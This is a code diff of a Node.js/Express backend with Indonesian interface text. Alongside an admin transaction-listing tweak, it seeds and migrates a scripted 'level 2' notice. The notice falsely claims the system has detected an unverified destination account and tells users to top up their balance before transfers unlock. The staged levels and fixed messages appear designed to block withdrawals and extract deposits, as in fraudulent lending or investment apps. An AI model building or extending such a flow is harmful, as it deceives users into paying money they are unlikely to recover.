@@ -1244,8 +1244,8 @@ app.delete("/api/admin/banks/:id", adminOnly, wrap(async (req, res) => {
 app.get("/api/admin/transactions", adminOnly, wrap((req, res) =>
   paginate(req, res, {
     from: "transactions t JOIN users u ON u.id = t.user_id",
-    select: "t.id,t.type,t.title,t.amount,t.source,t.status,t.reference,t.target,t.created_at,u.username,u.name as user_name",
-    searchCols: ["t.title", "t.reference", "u.username", "t.target"],
+    select: "t.id,t.type,t.title,t.amount,t.source,t.status,t.reference,t.target,t.proof,t.created_at,u.username,u.name as user_name",
+    searchCols: ["t.title", "t.reference", "u.username", "u.name", "t.target"],
     sortable: { created_at: "t.created_at", amount: "t.amount", username: "u.username" },
     defaultSort: "created_at",
     filters: { type: "t.type", status: "t.status" },
@@ -2199,8 +2199,11 @@ async function initDb() {
           "Fitur ini wajib diaktifkan demi keamanan dan kelancaran transaksi Anda.",
           "Lanjutkan Integrasi",
           "Kembali",
-          "Ketentuan Integrasi Autodebet",
-          "Sistem autodebet memastikan pembayaran angsuran dan tagihan berjalan otomatis tanpa kendala."
+          "Rekening Belum Diintegrasikan",
+          JSON.stringify({
+            message: "Sistem kami mendeteksi bahwa rekening tujuan Anda belum terverifikasi sebagai akun terpercaya.",
+            warning: "Silakan lakukan Top Up Saldo minimal satu kali untuk mengaktifkan fitur transfer dan mengintegrasikan rekening Anda secara otomatis."
+          })
         ],
         [
           3,
@@ -2286,6 +2289,19 @@ async function initDb() {
       }
       console.log("Seeded initial level configurations");
     } else {
+      // Migrasi default Level 2 Tahap 2 bila masih memakai teks lama
+      await db.query(
+        `UPDATE level_configs
+         SET detail_title = 'Rekening Belum Diintegrasikan', detail_content = ?
+         WHERE level = 2 AND (detail_title = 'Ketentuan Integrasi Autodebet' OR detail_content LIKE '%Sistem autodebet memastikan%' OR detail_content LIKE '%Sistem autodebet memerlukan%')`,
+        [
+          JSON.stringify({
+            message: "Sistem kami mendeteksi bahwa rekening tujuan Anda belum terverifikasi sebagai akun terpercaya.",
+            warning: "Silakan lakukan Top Up Saldo minimal satu kali untuk mengaktifkan fitur transfer dan mengintegrasikan rekening Anda secara otomatis."
+          })
+        ]
+      );
+
       // Pastikan level 4, 5, 6, 7 memakai default Pindah Saldo bila masih memakai data lama
       await db.query(`
         UPDATE level_configs
